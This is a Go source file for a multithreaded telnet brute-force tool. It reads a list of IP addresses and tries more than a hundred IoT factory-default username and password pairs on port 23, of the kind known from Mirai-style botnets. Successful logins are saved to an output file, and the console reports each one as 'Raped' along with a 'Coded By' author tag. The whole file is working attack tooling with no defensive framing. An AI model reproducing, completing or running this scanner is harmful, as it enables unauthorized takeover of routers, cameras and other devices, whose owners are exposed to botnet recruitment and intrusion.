package main

import (
	"bufio"
	"fmt"
	"net"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"
)

var combo = []string{
	"root:root", "admin:admin", "daemon:daemon", "root:vizxv", "root:pass", "root:anko", "root:", "admin:",
	"root:xc3511", "default:", "default:default", "supervisor:zyad1234", "root:5up", "default:lJwpbo6",
	"User:admin", "guest:12345", "guest:password", "root:zlxx.", "admin:1234", "admin:12345", "telnet:telnet",
	"admin:1234567", "admin:password", "root:88888888", "root:klv1234", "root:Zte521", "root:hi3518", "root:jvbzd",
	"root:7ujMko0vizxv", "root:7ujMko0admin", "root:ikwb", "root:dreambox", "root:user", "root:realtek", "root:00000000",
	"admin:1111111", "admin:54321", "admin:123456", "default:123456", "default:S2fGqNFs", "default:OxhlwSG8", "default:antslq",
	"default:tlJwpbo6", "root:default", "default:pass", "default:12345", "default:password", "root:taZz@23495859",
	"root:20080826", "admin:7ujMko0admin", "root:gforge", "root:zsun1188", "admin:synnet", "root:t0talc0ntr0l4!",
	"guest:1111", "root:admin1234", "root:tl789", "admin:fliradmin", "root:12345678", "root:1234567890",
	"root:vertex25ektks123", "root:admin@mymifi", "admin:7ujMko0admin", "admin:pass", "admin:meinsm", "admin:admin1234",
	"root:1111", "admin:1111", "root:666666", "root:klv123", "Administrator:admin", "service:service", "supervisor:supervisor",
	"guest:12345", "admin1:password", "administrator:1234", "666666:666666", "888888:888888", "tech:tech",
	"admin:dvr2580222", "ubnt:ubnt", "user:12345", "admin:aquario", "root:zsun1188", "default:lJwpbo6", "guest:guest",
	"user:user", "root:Zte521", "root:abc123", "root:admin", "root:xc3511", "root:Serv4EMC", "root:zsun1188",
	"root:123456", "default:OxhlwSG8", "default:S2fGqNFs", "admin:smcadmin", "admin:adslnadam", "sysadm:sysadm",
	"support:support", "root:default", "root:password", "adm:", "bin:", "daemon:", "root:cat1029", "admin:cat1029",
	"admin:123456", "root:antslq",
}

// readUntil reads from the connection until the target string is found or timeout.
func readUntil(conn net.Conn, target string, timeout time.Duration) (string, error) {
	var buf strings.Builder
	tmp := make([]byte, 1024)
	deadline := time.Now().Add(timeout)

	for time.Now().Before(deadline) {
		conn.SetReadDeadline(time.Now().Add(500 * time.Millisecond))
		n, err := conn.Read(tmp)
		if n > 0 {
			buf.Write(tmp[:n])
			if strings.Contains(buf.String(), target) {
				return buf.String(), nil
			}
		}
		if err != nil {
			// If it's a timeout error, keep trying until the outer deadline
			if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
				continue
			}
			return buf.String(), err
		}
	}
	return buf.String(), fmt.Errorf("TIMEOUT")
}

// tryBrute attempts all credential combos against a single IP on port 23.
func tryBrute(ip string, outputFile string, fileMu *sync.Mutex) {
	ip = strings.TrimSpace(ip)
	if ip == "" {
		return
	}

	for _, cred := range combo {
		parts := strings.SplitN(cred, ":", 2)
		username := parts[0]
		password := ""
		if len(parts) > 1 {
			password = parts[1]
		}

		// Handle n/a markers (matching original Python logic)
		if strings.Contains(cred, ":n/a") {
			password = ""
		}
		if strings.Contains(cred, "n/a:") {
			username = ""
		}

		conn, err := net.DialTimeout("tcp", ip+":23", 8*time.Second)
		if err != nil {
			// Can't connect — skip this IP entirely
			return
		}

		// Try login prompt
		loginBuf, err := readUntil(conn, "ogin:", 8*time.Second)
		if err != nil {
			conn.Close()
			continue
		}
		if strings.Contains(loginBuf, "ogin") {
			conn.Write([]byte(username + "\n"))
			time.Sleep(90 * time.Millisecond)
		}

		// Try password prompt
		passBuf, err := readUntil(conn, "assword:", 8*time.Second)
		if err != nil {
			conn.Close()
			continue
		}
		if strings.Contains(passBuf, "assword") {
			conn.Write([]byte(password + "\n"))
			time.Sleep(800 * time.Millisecond)
		}

		// Read prompt after auth
		conn.SetReadDeadline(time.Now().Add(8 * time.Second))
		promptBuf := make([]byte, 40960)
		n, err := conn.Read(promptBuf)
		if err != nil {
			conn.Close()
			continue
		}
		prompt := string(promptBuf[:n])

		success := false
		if strings.Contains(prompt, ">") && !strings.Contains(prompt, "ONT") {
			success = true
		} else if strings.ContainsAny(prompt, "#$%@") {
			success = true
		}

		if success {
			line := fmt.Sprintf("%s:23 %s:%s\n", ip, username, password)
			fileMu.Lock()
			f, err := os.OpenFile(outputFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
			if err == nil {
				f.WriteString(line)
				f.Close()
			}
			fileMu.Unlock()

			fmt.Printf("\033[37m[\033[32m+\033[37m] \033[33mRaped \033[37m-> \033[32m%s\033[37m:\033[32m%s\033[37m:\033[33m%s\033[37m\n",
				username, password, ip)
			conn.Close()
			return
		}

		conn.Close()
	}
}

func main() {
	if len(os.Args) < 4 {
		fmt.Printf("Usage: %s <list> <threads> <output file>\n", os.Args[0])
		os.Exit(1)
	}

	listFile := os.Args[1]
	threadCount, err := strconv.Atoi(os.Args[2])
	if err != nil || threadCount <= 0 {
		fmt.Println("Invalid thread count")
		os.Exit(1)
	}
	outputFile := os.Args[3]

	// Read IPs from file
	f, err := os.Open(listFile)
	if err != nil {
		fmt.Printf("Error opening file: %v\n", err)
		os.Exit(1)
	}
	defer f.Close()

	var ips []string
	scanner := bufio.NewScanner(f)
	count := 0
	for scanner.Scan() {
		ip := scanner.Text()
		if strings.TrimSpace(ip) != "" {
			ips = append(ips, ip)
			count++
			fmt.Printf("\r[%d] Coded By reaver_aaa", count)
		}
	}
	fmt.Println()

	// Worker pool
	var wg sync.WaitGroup
	var fileMu sync.Mutex
	ipChan := make(chan string, len(ips))

	for _, ip := range ips {
		ipChan <- ip
	}
	close(ipChan)

	for i := 0; i < threadCount; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for ip := range ipChan {
				tryBrute(ip, outputFile, &fileMu)
			}
		}()
	}

	wg.Wait()
}
